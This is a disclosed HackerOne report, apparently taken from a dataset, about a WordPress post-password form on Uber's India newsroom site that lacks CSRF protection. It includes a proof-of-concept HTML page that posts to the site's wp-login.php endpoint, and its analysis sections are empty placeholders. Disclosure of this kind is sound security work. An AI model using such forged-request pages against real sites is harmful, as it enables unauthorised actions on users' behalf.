---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '144147'
original_report_id: '144147'
title: Newsroom.uber HTML form without CSRF protection
weakness: Cross-Site Request Forgery (CSRF)
team_handle: uber
created_at: '2016-06-11T02:45:25.006Z'
disclosed_at: '2016-07-07T23:19:42.497Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 3
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Newsroom.uber HTML form without CSRF protection

## Metadata

- HackerOne Report ID: 144147
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: uber
- Disclosed At: 2016-07-07T23:19:42.497Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hi,

The link that exists CSRF vulnerability 

https://newsroom.uber.com/india/how-to-refer/


Attack details

Form name: Empty
Form action: https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog
Form method: POST

Reproduction Steps

1-Create a file named submit.html

2-Write this code to file

<html>

  <body>
    <form action="https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog" method="POST">
      <input type="hidden" name="post&#95;password" value="xxxxxxx" />
      <input type="hidden" name="Submit" value="Enter" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


3-Then open the file with a browser click the Submit request button

NOTE:

It is an example so I didn't use a real value as you can see I used xxxxx you can change it to numbers.

I added the submit.html file to attachments.

Best regards...

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
